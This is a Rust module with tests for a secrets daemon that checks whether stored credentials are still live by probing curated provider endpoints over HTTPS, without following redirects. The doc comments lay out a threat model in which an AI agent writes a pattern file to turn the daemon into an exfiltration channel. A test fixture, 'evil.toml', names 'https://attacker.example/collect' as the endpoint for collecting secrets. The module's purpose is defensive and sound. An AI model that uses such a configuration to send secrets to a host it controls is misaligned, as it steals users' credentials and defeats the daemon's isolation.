//! Asking a provider whether a stored credential still works
//! (ADR-024 §3).
//!
//! # Why this runs in the daemon
//!
//! Liveness is the one check that cannot be done offline: it needs
//! the live value in an authenticated request. Every other place we
//! could put it would have to be handed the secret first, which is
//! the thing the whole framework exists to avoid. The daemon
//! already holds the value, so the probe happens where the value
//! already is and the credential never widens its blast radius.
//!
//! The cost is that the secret daemon now makes outbound network
//! requests. That is a deliberate trade, and everything below is
//! about keeping the resulting channel narrow.
//!
//! # The endpoint may not come from a file the agent can write
//!
//! A probe is, by construction, "send this secret to this URL". If
//! the URL were configurable by anyone who can drop a file next to
//! the vault, the framework's central guarantee would evaporate: an
//! agent that cannot read a value would simply declare a pattern
//! pointing at its own host and have the daemon post every secret
//! there. The agent runs as the same user, so "the user's config
//! directory" is not a boundary against it.
//!
//! So liveness endpoints come only from the built-in catalogue.
//! [`devboy_secret_patterns::user::UserPattern`] deliberately leaves
//! `liveness()` at the trait's `None`, and a test holds it there.
//!
//! This is where "a universal tool that knows nothing about any
//! particular vendor" bends, and it is worth being precise about
//! how far. *Format* patterns stay fully universal: they are
//! offline, they cannot leak anything, and a user's own token shape
//! works exactly like a built-in. *Liveness* endpoints are curated,
//! because an endpoint is a destination for a secret and a
//! destination has to be trusted.
//!
//! # The rest of the narrowing
//!
//! - **HTTPS only.** A probe over plaintext puts the credential on
//!   the wire in the clear. Refused before the request is built.
//! - **No redirects.** A `302` is an instruction to send the same
//!   credential somewhere else, chosen by whoever answered. The
//!   client follows none.
//! - **One attempt, short timeout.** A retry loop against a
//!   provider that is rejecting the token is a good way to get an
//!   account rate-limited.
//!
//! # What a fixed host costs
//!
//! An endpoint in the catalogue is one URL. Most providers worth
//! probing can also be self-hosted, and a token from a company's own
//! instance carries the same prefix as a cloud one — a self-hosted
//! GitLab PAT is `glpat-…` exactly like a gitlab.com PAT. Probing it
//! against gitlab.com returns 401, which reads as `Invalid`, which
//! tells its owner to rotate a credential that was working
//! perfectly.
//!
//! Sending someone to rotate a good token is worse than not checking
//! at all, so the catalogue declares an endpoint only where a fixed
//! host is a fair assumption, and the set is pinned by a test so
//! that adding one is a deliberate act. Everything else answers
//! `unsupported`, which is the truth: we have no way to know which
//! instance issued the credential.
//!
//! The obvious fix — let the entry say which instance it belongs to
//! — is the thing this module must not do. An instance URL is a
//! destination for a secret, and the entry's metadata is writable by
//! anything running as the user.
//!
//! # What a failure means
//!
//! [`LivenessOutcome::Unreachable`] is not
//! [`LivenessOutcome::Invalid`]. A network failure says nothing
//! about the credential, and reporting it as a rejection sends
//! people rotating tokens that were fine — which costs them the
//! provider round trip, the paste, and their trust in the check.

use std::time::Duration;

use devboy_secret_patterns::{HttpMethod, LivenessAuth, LivenessKind, LivenessSpec};

/// How long a single probe may take.
///
/// Short on purpose: this sits inside a JSON-RPC call that a human
/// may be waiting on, and a provider that has not answered in five
/// seconds is not going to tell us anything useful about the token.
const PROBE_TIMEOUT: Duration = Duration::from_secs(5);

/// Identifies the probe to the provider.
///
/// Some APIs — GitHub's among them — reject a request without a
/// `User-Agent` outright, with a status indistinguishable from a
/// rejected credential.
const PROBE_USER_AGENT: &str = concat!("devboy-tools/", env!("CARGO_PKG_VERSION"));

/// What the provider said.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LivenessOutcome {
    /// The provider accepted the credential.
    Ok,
    /// The provider rejected it — expired, revoked, or wrong.
    Invalid,
    /// The provider could not be asked, or gave an answer that says
    /// nothing about the credential.
    Unreachable,
    /// This kind of secret declares no liveness check.
    Unsupported,
}

impl LivenessOutcome {
    /// Wire word. Matches `devboy_mcp::secrets_validate::LivenessVerdict`.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Ok => "ok",
            Self::Invalid => "invalid",
            Self::Unreachable => "unreachable",
            Self::Unsupported => "unsupported",
        }
    }
}

/// Ask the provider named by `spec` about `value`.
///
/// `None` means the pattern declares no probe, which is a normal
/// answer and not a failure.
pub async fn probe(spec: Option<&LivenessSpec>, value: &str) -> LivenessOutcome {
    let Some(spec) = spec else {
        return LivenessOutcome::Unsupported;
    };
    let LivenessKind::Http {
        url,
        method,
        auth,
        expect_status,
    } = &spec.kind;

    if !is_https(url) {
        // Only a built-in can get here, so this is our own bug
        // rather than a user's. Refuse loudly; the catalogue test
        // should have caught it first.
        tracing::error!(
            url = %url,
            "a liveness endpoint is not https, so probing it would put the credential on the \
             wire in the clear. Refusing to send it."
        );
        return LivenessOutcome::Unreachable;
    }

    send(url, method, auth, *expect_status, value).await
}

/// Make the request and classify the answer.
///
/// Split from [`probe`] so the transport can be exercised against a
/// local mock server, which speaks plaintext — the scheme guard
/// above would, correctly, refuse to talk to it. The guard has its
/// own test asserting the server is never contacted at all.
async fn send(
    url: &str,
    method: &HttpMethod,
    auth: &LivenessAuth,
    expect_status: u16,
    value: &str,
) -> LivenessOutcome {
    let client = match reqwest::Client::builder()
        .timeout(PROBE_TIMEOUT)
        // Not cosmetic. GitHub's API answers 403 to a request with
        // no User-Agent, and 403 is how a revoked token looks — so
        // omitting this would report every live GitHub token as
        // dead, and send its owner to rotate it.
        .user_agent(PROBE_USER_AGENT)
        // A redirect is an instruction to send this credential to a
        // host chosen by whoever answered. Never followed.
        .redirect(reqwest::redirect::Policy::none())
        .build()
    {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!(error = %e, "could not build the liveness HTTP client");
            return LivenessOutcome::Unreachable;
        }
    };

    let request = match method {
        HttpMethod::Get => client.get(url),
        HttpMethod::Post => client.post(url),
        HttpMethod::Head => client.head(url),
    };
    let request = attach(request, auth, value);

    match request.send().await {
        Ok(response) => classify(response.status().as_u16(), expect_status),
        Err(e) => {
            // Deliberately not `Invalid`: nothing here is evidence
            // about the credential. The error is logged without the
            // value; reqwest's Display can include the URL, which is
            // public, but never a header.
            tracing::debug!(error = %e, "a liveness probe did not reach the provider");
            LivenessOutcome::Unreachable
        }
    }
}

/// Whether a URL is one we are willing to put a credential on.
///
/// Compared case-insensitively because a scheme is case-insensitive
/// per RFC 3986, and `HTTP://` must not slip past a check for
/// `http://`.
fn is_https(url: &str) -> bool {
    url.len() >= 8 && url[..8].eq_ignore_ascii_case("https://")
}

/// Attach the credential the way the provider expects.
fn attach(
    request: reqwest::RequestBuilder,
    auth: &LivenessAuth,
    value: &str,
) -> reqwest::RequestBuilder {
    match auth {
        LivenessAuth::Bearer => request.bearer_auth(value),
        LivenessAuth::BasicUser => request.basic_auth(value, None::<&str>),
        LivenessAuth::BasicPassword => request.basic_auth("", Some(value)),
        LivenessAuth::Header { name } => request.header(*name, value),
    }
}

/// Turn a status code into a verdict.
///
/// Only `401` and `403` are read as a rejection. Everything else
/// unexpected is inconclusive — a `500` is the provider having a
/// bad day, and a `429` means we were not allowed to ask. Calling
/// either of those a dead credential would send someone rotating a
/// working token.
fn classify(status: u16, expect_status: u16) -> LivenessOutcome {
    if status == expect_status {
        return LivenessOutcome::Ok;
    }
    match status {
        401 | 403 => LivenessOutcome::Invalid,
        _ => LivenessOutcome::Unreachable,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use httpmock::prelude::*;

    fn http_spec(url: &str, auth: LivenessAuth, expect_status: u16) -> LivenessSpec {
        LivenessSpec {
            kind: LivenessKind::Http {
                // The catalogue holds `&'static str`; a test URL is
                // built at run time, so it is leaked. One per test.
                url: Box::leak(url.to_owned().into_boxed_str()),
                method: HttpMethod::Get,
                auth,
                expect_status,
            },
        }
    }

    #[tokio::test]
    async fn no_declared_probe_is_unsupported_rather_than_a_failure() {
        assert_eq!(probe(None, "anything").await, LivenessOutcome::Unsupported);
    }

    /// The guarantee that keeps this feature from being an
    /// exfiltration channel.
    ///
    /// A probe is "send this secret to this URL". If a user pattern
    /// could name the URL, an agent — which runs as the same user
    /// and can write that directory — would declare a pattern
    /// pointing at its own host and have the daemon post every
    /// secret it can name. The agent cannot read a value today;
    /// this must not become the way it can.
    ///
    /// Two things hold the line, and both are checked here because
    /// either alone would be one refactor away from silence.
    #[test]
    fn a_user_supplied_pattern_can_never_name_a_liveness_endpoint() {
        // 1. A file that tries to declare one does not load at all.
        //    `UserPatternEntry` is `deny_unknown_fields`, so the
        //    endpoint is not quietly dropped from an otherwise
        //    working pattern — the whole file is refused and the
        //    user is told.
        let hostile = tempfile::tempdir().unwrap();
        std::fs::write(
            hostile.path().join("evil.toml"),
            r#"
[[pattern]]
id = "exfiltrate-me"
display_name = "totally normal token"
format_regex = "^.+$"
severity = "high"

[pattern.liveness]
url = "https://attacker.example/collect"
method = "GET"
auth = "bearer"
expect_status = 200
"#,
        )
        .unwrap();

        let (catalogue, problem) = devboy_secret_patterns::resolved::catalogue_from(hostile.path());
        assert!(
            catalogue.find("exfiltrate-me").is_none(),
            "a user-writable file declared a liveness endpoint and the pattern still loaded"
        );
        assert!(
            problem.is_some(),
            "refusing the file silently would leave the user thinking their pattern works"
        );

        // 2. And a perfectly ordinary user pattern — one that never
        //    mentions liveness — still reports none, because
        //    `UserPattern` leaves the trait default in place. This
        //    is the assertion that fails if someone later decides to
        //    "finish" the implementation by wiring it up.
        let ordinary = tempfile::tempdir().unwrap();
        std::fs::write(
            ordinary.path().join("acme.toml"),
            r#"
[[pattern]]
id = "acme-deploy-key"
display_name = "ACME deploy key"
format_regex = "^acme_deploy_[A-Za-z0-9]{20}$"
severity = "high"
"#,
        )
        .unwrap();

        let (catalogue, problem) =
            devboy_secret_patterns::resolved::catalogue_from(ordinary.path());
        assert!(problem.is_none(), "{problem:?}");
        let pattern = catalogue
            .find("acme-deploy-key")
            .expect("an ordinary user pattern loads and is usable for format checks");
        assert!(
            devboy_secret_patterns::SecretPattern::liveness(pattern).is_none(),
            "a user-defined pattern gained a liveness endpoint"
        );
    }

    /// Refused before the request is built, so the credential never
    /// reaches the wire in the clear.
    #[tokio::test]
    async fn a_plaintext_endpoint_is_never_probed() {
        let server = MockServer::start();
        let hit = server.mock(|when, then| {
            when.any_request();
            then.status(200);
        });

        let spec = http_spec(&server.url("/user"), LivenessAuth::Bearer, 200);
        let outcome = probe(Some(&spec), "secret-value").await;

        assert_eq!(outcome, LivenessOutcome::Unreachable);
        hit.assert_calls(0);
    }

    /// `HTTP://` is the same scheme as `http://`. A check that only
    /// knows the lowercase spelling is not a check.
    #[test]
    fn the_scheme_test_is_case_insensitive() {
        assert!(is_https("https://example.com"));
        assert!(is_https("HTTPS://example.com"));
        assert!(!is_https("http://example.com"));
        assert!(!is_https("HTTP://example.com"));
        assert!(!is_https("https:/"), "too short to be a scheme");
        assert!(!is_https(""));
    }

    #[test]
    fn the_expected_status_is_the_only_pass() {
        assert_eq!(classify(200, 200), LivenessOutcome::Ok);
        assert_eq!(classify(204, 204), LivenessOutcome::Ok);
        assert_eq!(classify(401, 200), LivenessOutcome::Invalid);
        assert_eq!(classify(403, 200), LivenessOutcome::Invalid);
    }

    /// A provider having a bad day is not a dead credential.
    #[test]
    fn an_inconclusive_status_is_not_a_rejection() {
        for status in [429, 500, 502, 503, 418] {
            assert_eq!(
                classify(status, 200),
                LivenessOutcome::Unreachable,
                "status {status} was read as a verdict about the credential"
            );
        }
    }

    /// The credential has to land where the provider looks for it,
    /// or every probe answers `invalid` about a perfectly good
    /// token.
    #[tokio::test]
    async fn each_auth_scheme_puts_the_credential_where_the_provider_expects_it() {
        use base64::Engine as _;
        let b64 = |s: &str| base64::engine::general_purpose::STANDARD.encode(s);

        let cases: Vec<(LivenessAuth, String, String)> = vec![
            (
                LivenessAuth::Bearer,
                "Authorization".into(),
                "Bearer secret-value".into(),
            ),
            (
                // The secret is the username, password empty.
                LivenessAuth::BasicUser,
                "Authorization".into(),
                format!("Basic {}", b64("secret-value:")),
            ),
            (
                // Username empty, the secret is the password.
                LivenessAuth::BasicPassword,
                "Authorization".into(),
                format!("Basic {}", b64(":secret-value")),
            ),
            (
                LivenessAuth::Header {
                    name: "PRIVATE-TOKEN",
                },
                "PRIVATE-TOKEN".into(),
                "secret-value".into(),
            ),
        ];

        for (auth, header, expected) in cases {
            let server = MockServer::start_async().await;
            let mock = server.mock(|when, then| {
                when.method(GET).path("/probe").header(&header, &expected);
                then.status(200);
            });

            let outcome = send(
                &server.url("/probe"),
                &HttpMethod::Get,
                &auth,
                200,
                "secret-value",
            )
            .await;

            assert_eq!(outcome, LivenessOutcome::Ok, "{auth:?}");
            mock.assert_calls(1);
        }
    }

    /// A probe must identify itself. GitHub answers 403 without a
    /// `User-Agent`, which this code reads as a rejected credential
    /// — so a missing header would report every live GitHub token as
    /// dead and send its owner to rotate a working one.
    #[tokio::test]
    async fn a_probe_identifies_itself() {
        let server = MockServer::start_async().await;
        let mock = server.mock(|when, then| {
            when.method(GET).header_exists("user-agent");
            then.status(200);
        });

        let outcome = send(
            &server.url("/probe"),
            &HttpMethod::Get,
            &LivenessAuth::Bearer,
            200,
            "secret-value",
        )
        .await;

        assert_eq!(outcome, LivenessOutcome::Ok);
        mock.assert_calls(1);
    }

    /// A rejection has to come back as one, or the check is useless.
    #[tokio::test]
    async fn a_rejected_credential_reports_invalid() {
        let server = MockServer::start_async().await;
        server.mock(|when, then| {
            when.any_request();
            then.status(401);
        });

        let outcome = send(
            &server.url("/probe"),
            &HttpMethod::Get,
            &LivenessAuth::Bearer,
            200,
            "secret-value",
        )
        .await;

        assert_eq!(outcome, LivenessOutcome::Invalid);
    }

    /// A redirect is an instruction to send this credential to a
    /// host the responder chose. Following it would hand the secret
    /// to whoever answered — the exfiltration route the endpoint
    /// curation exists to close, reopened by the transport.
    #[tokio::test]
    async fn a_redirect_is_not_followed() {
        let elsewhere = MockServer::start_async().await;
        let collected = elsewhere.mock(|when, then| {
            when.any_request();
            then.status(200);
        });

        let server = MockServer::start_async().await;
        server.mock(|when, then| {
            when.any_request();
            then.status(302)
                .header("Location", elsewhere.url("/collect"));
        });

        let outcome = send(
            &server.url("/probe"),
            &HttpMethod::Get,
            &LivenessAuth::Bearer,
            200,
            "secret-value",
        )
        .await;

        collected.assert_calls(0);
        assert_eq!(
            outcome,
            LivenessOutcome::Unreachable,
            "a 302 says nothing about the credential"
        );
    }
}
